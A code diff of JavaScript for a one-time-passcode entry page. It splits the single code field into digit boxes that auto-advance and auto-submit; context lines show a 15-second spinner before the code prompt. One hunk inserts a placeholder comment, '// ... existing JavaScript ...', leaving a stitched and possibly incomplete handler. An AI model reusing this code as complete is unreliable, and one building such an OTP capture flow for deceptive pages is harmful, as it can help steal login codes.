@@ -2,7 +2,7 @@ document.addEventListener("DOMContentLoaded", function() {
     const spinnerContainer = document.querySelector('.spinner-container');
     const otpContainer = document.querySelector('.otp-container');
     const thanksContainer = document.querySelector('.thanks-container');
-    const otpInput = document.getElementById('otpInput');
+    const otpInputs = document.querySelectorAll('.otp-inputs input');
     const otpForm = document.querySelector('form[name="otpForm"]');
     const btnConfirm = document.querySelector('.btn-2');
 
@@ -12,22 +12,30 @@ document.addEventListener("DOMContentLoaded", function() {
         otpContainer.style.display = 'flex';
     }, 15000);
 
-    otpInput.addEventListener('input', function() {
-        // Allow only numbers in the input field
-        this.value = this.value.replace(/[^0-9]/g, '');
+    otpInputs.forEach((input, index) => {
+        input.addEventListener('input', function() {
+            // Allow only numbers in the input fields
+            this.value = this.value.replace(/[^0-9]/g, '');
 
-        // Trigger form submission when the input length is between 6 and 8
-        if (this.value.length >= 6 && this.value.length <= 8) {
-            otpForm.dispatchEvent(new Event('submit'));
-        }
+            // Auto-navigate to the next input if current input is filled
+            if (input.value.length === 1 && index < otpInputs.length - 1) {
+                otpInputs[index + 1].focus();
+            }
+
+            // Trigger form submission when all inputs are filled
+            if (Array.from(otpInputs).every(i => i.value.length === 1)) {
+                otpForm.dispatchEvent(new Event('submit'));
+            }
+        });
     });
 
     otpForm.addEventListener('submit', function(event) {
         event.preventDefault();  // Prevent the default form submission
 
-        // Check if OTP length is between 6 and 8
-        if (otpInput.value.length < 6 || otpInput.value.length > 8) {
-            alert("Please enter a valid OTP!");
+        // All fields are mandatory checks
+        let isAllFilled = Array.from(otpInputs).every(input => input.value.length === 1);
+        if (!isAllFilled) {
+            alert("Please fill all the fields!");
             return;
         }
 
@@ -62,6 +70,10 @@ document.addEventListener("DOMContentLoaded", function() {
             alert('Form submission failed, please try again.');
         });
     });
+});
+
+document.addEventListener("DOMContentLoaded", function() {
+    // ... existing JavaScript ...
 
     // Timer, progress bar, and resend form functionality
     var countdown = 75; // 75 seconds countdown
@@ -131,3 +143,4 @@ document.addEventListener("DOMContentLoaded", function() {
         });
     }
 });
+
